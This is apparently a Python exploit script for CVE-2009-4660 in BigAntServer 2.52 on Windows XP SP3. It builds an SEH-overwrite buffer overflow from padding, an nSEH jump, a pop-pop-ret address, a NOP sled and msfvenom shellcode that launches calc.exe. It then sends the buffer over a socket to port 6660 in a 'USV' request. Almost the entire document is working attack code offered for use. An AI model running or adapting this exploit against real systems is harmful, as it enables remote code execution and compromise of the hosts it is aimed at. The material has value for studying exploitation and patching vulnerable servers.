#!/usr/bin/python

# Title: BigAntServer 2.52 - CVE-2009-4660
# Target binary: AntAdmin.exe
# Target system: Windows XP SP3

import socket
import sys

shellcode = "\xb8\xa2\x4f\xc5\x13\xd9\xc0\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
shellcode += "\x31\x31\x42\x13\x83\xc2\x04\x03\x42\xad\xad\x30\xef\x59\xb3"
shellcode += "\xbb\x10\x99\xd4\x32\xf5\xa8\xd4\x21\x7d\x9a\xe4\x22\xd3\x16"
shellcode += "\x8e\x67\xc0\xad\xe2\xaf\xe7\x06\x48\x96\xc6\x97\xe1\xea\x49"
shellcode += "\x1b\xf8\x3e\xaa\x22\x33\x33\xab\x63\x2e\xbe\xf9\x3c\x24\x6d"
shellcode += "\xee\x49\x70\xae\x85\x01\x94\xb6\x7a\xd1\x97\x97\x2c\x6a\xce"
shellcode += "\x37\xce\xbf\x7a\x7e\xc8\xdc\x47\xc8\x63\x16\x33\xcb\xa5\x67"
shellcode += "\xbc\x60\x88\x48\x4f\x78\xcc\x6e\xb0\x0f\x24\x8d\x4d\x08\xf3"
shellcode += "\xec\x89\x9d\xe0\x56\x59\x05\xcd\x67\x8e\xd0\x86\x6b\x7b\x96"
shellcode += "\xc1\x6f\x7a\x7b\x7a\x8b\xf7\x7a\xad\x1a\x43\x59\x69\x47\x17"
shellcode += "\xc0\x28\x2d\xf6\xfd\x2b\x8e\xa7\x5b\x27\x22\xb3\xd1\x6a\x28"
shellcode += "\x42\x67\x11\x1e\x44\x77\x1a\x0e\x2d\x46\x91\xc1\x2a\x57\x70"
shellcode += "\xa6\xc5\x1d\xd9\x8e\x4d\xf8\x8b\x93\x13\xfb\x61\xd7\x2d\x78"
shellcode += "\x80\xa7\xc9\x60\xe1\xa2\x96\x26\x19\xde\x87\xc2\x1d\x4d\xa7"
shellcode += "\xc6\x7d\x10\x3b\x8a\xaf\xb7\xbb\x29\xb0"
# msfvenom -p windows/exec cmd=calc.exe -a x86 -b "\x00\x0a\x0d\x20\x25"
# badchars \x00\x0a\x0d\x20\x25

payload = b"A"*962
payload += "\xeb\x22\x90\x90"           # nSEH: perform a 6-byte jump forward, the remaining 2 bytes are padded with nops
payload += "\xa9\x50\x82\x1b"           # SEH handler: 0x1B8250A9 pop esi, pop edi, ret
payload += "\x90"*50
payload += shellcode
payload += (b"D"*(3000-len(payload)))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 6660))
    s.send("USV " + payload + "\r\n\r\n")
    s.close()

except:
    print "[-] Error connecting to the target. Exiting..."
    sys.exit()
